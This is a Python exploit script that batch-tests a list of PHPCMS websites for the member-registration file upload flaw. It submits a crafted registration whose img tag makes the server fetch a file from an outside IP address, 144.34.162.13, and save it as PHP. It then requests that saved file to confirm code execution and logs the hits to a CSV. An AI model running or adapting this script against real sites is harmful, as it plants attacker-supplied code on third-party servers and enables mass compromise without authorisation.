import re
import os
import csv
import requests
import random
from datetime import datetime

class PHPCMS():
    def __init__(self):
        self.version = "-1"
        self.vuln_exist = "-1"
        self.vuln_success_url = "-1"
        self.vuln_success_result = "-1"

    def randomstr(self,length):
        s = ""
        dic = "abcdefghijklmnopqrstuvwxyz"
        for i in range(int(length)):
            s += dic[random.randint(0, 25)]
        return s
    def check_vulnerability(self,url):
        try:
            version_url = "{}/index.php?m=member&c=index&a=register&siteid=1".format(url)
            response = requests.get(version_url)
            version_pattern = r'Powered by.*?PHPCMS.*?(v\d+)'
            match = re.search(version_pattern, response.text)

            if match:
                self.version = match.group(1)
                print("PHPCms版本:{}".format(self.version))
            else:
                print("PHPCms版本:未知")

            headers = {
                "content-type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            }
            random_username = self.randomstr(6)
            random_password = self.randomstr(6)
            random_email = self.randomstr(6)

            body = "siteid=1&modelid=1&username={}&password={}&pwdconfirm={}&email={}@qq.com&info[content]=<img src=http://144.34.162.13:8080/3.txt?.php#.jpg>&dosubmit=1&protocol=".format(random_username,random_password,random_password,random_email)
            vuln_url = "{}/index.php?m=member&c=index&a=register&siteid=1".format(url)
            if url.startswith("https://"):
                response = requests.post(vuln_url,headers=headers,data=body.encode('utf-8') ,verify=False)
            else:
                response = requests.post(vuln_url, headers=headers,data=body.encode('utf-8') )
            if response.status_code == 200:
                vuln_pattern = r"&lt;img src=(.*)&gt"
                match = re.search(vuln_pattern, response.text)
                if match:
                    vuln_url_2 = match.group(1)
                    if url.startswith("https://"):
                        response = requests.get(vuln_url_2, headers=headers, verify=False)
                    else:
                        response = requests.get(vuln_url_2, headers=headers)
                    if response.status_code == 200:
                        if "PHP Version" in response.text:
                            print("vuln exist:{}".format(url))
                            self.vuln_exist = 1
                            self.vuln_success_result = 1
                            self.vuln_success_url = vuln_url_2
                        else:
                            print("no vuln:{}".format(url))
                            self.vuln_exist = 0
                    else:
                        print("response2.status_code={}".format(response.status_code))
            else:
                print("response1.status_code={}".format(response.status_code))
        except Exception as e:
            print("网络异常:{}".format(e))


    def append_data_to_csv(self,file_name, data):
        file_path = os.path.join(os.getcwd(), file_name)
        file_exists = False
        if os.path.exists(file_path):
            file_exists = True
        with open(file_path, 'a+', newline='') as csvfile:
            writer = csv.writer(csvfile)
            if not file_exists:
                writer.writerow(data.keys())
            writer.writerow(data.values())




if __name__ == "__main__":
    test_url_list = []
    now = datetime.now()
    date_string = now.strftime("%Y-%m-%d")
    with open('url.txt', 'r', encoding='utf-8') as file:
        for line in file:
            test_url_list.append(line.strip())
    for url in test_url_list:
        cms = PHPCMS()
        url = url[:-1] if url.endswith("/") else url
        cms.check_vulnerability(url)

        url_vuln_info = {
                "url":url,
                "version":cms.version,
                "vuln_exist":cms.vuln_exist,
                "vuln_success_url":cms.vuln_success_url,
                "vuln_success_result":cms.vuln_success_result,
                "date_string":date_string
            }
        cms.append_data_to_csv("out.csv",url_vuln_info)
